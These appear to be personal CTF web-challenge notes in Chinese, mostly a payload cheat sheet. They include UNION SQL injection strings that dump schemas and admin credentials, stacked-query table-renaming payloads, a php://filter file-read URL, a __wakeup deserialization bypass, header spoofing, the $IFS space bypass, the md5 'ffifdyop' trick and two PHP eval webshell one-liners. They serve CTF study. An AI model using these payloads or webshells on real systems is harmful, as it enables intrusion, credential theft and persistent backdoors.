* web题目，flag文件一般认为在根目录，web服务文件在／var/www/html/目录。

* 在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符.

* 常规注入

  ```shell
  #爆出所有库名
  ?id=0 union select 1,group_concat(distinct table_schema) from information_schema.columns
  #爆出数据库news的所有表名
  ?id=0 union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema = 'news'
  #爆出表admin的所有列
  ?id=0 union select 1,group_concat(distinct column_name) from information_schema.columns where table_name = 'admin'
  #查username和password，中间用:隔开
  ?id=0 union select 1,group_concat(username,0x3a,password) from admin
  ```

* 数字注入

  hack world 1

* sql注入 尝试show tables；or；预处理语句；1' or 1=1;# 好用的语句。

  union 的用法值得研究一下，以及其他常用的注入手法。

  ```sql
  0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#

  char(115,101,108,101,99,116)<----->'select'

  1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#

  ```

* web PHP filter 显示后台文件

  ```php
  YOUR_URL?file=php://filter/convert.base64-encode/resource=flag.php
  ```

* PHP

  ```php
  __wakeup()方法绕过
  作用：
  与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。
  绕过：
  当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。
  所以在上面name后面的2表示有2个属性，我们改成3之后他会绕过__wakeup()
    
  <?php
  class Name
  {
      private $username = 'admin';
      private $password = '100';
  }
  $a = new Name();
  echo serialize($a);
  #进行url编码，防止%00对应的不可打印字符在复制时丢失
  echo urlencode(serialize($a));
  #未编码的情况
  //O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
  //Name后面的2在链接中要改成3
  ?>
  ```

* search by python 

  开源项目 dirsearch

* url

  ```
  +    URL 中+号表示空格                                 %2B  
  空格 URL中的空格可以用+号或者编码           %20
  /   分隔目录和子目录                                     %2F    
  ?    分隔实际的URL和参数                             %3F    
  %    指定特殊字符                                          %25    
  #    表示书签                                                  %23    
  &    URL 中指定的参数间的分隔符                  %26    
  =    URL 中指定参数的值                                %3D

  $IFS$1可以代替空格
  ```

* 伪造headers

  ```shell
  Referer 伪造来自哪里
  X-Forwarded-For 伪造IP
  User-Agent 伪造浏览器
  ```

* webshell

  ```php
  <?php @eval($_POST[cmd]);?>
  <script language='php'>eval($_POST['shell']);</script>
  ```

* md5 注入

  ```
  ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ' or '6
  ```

  ​

  ​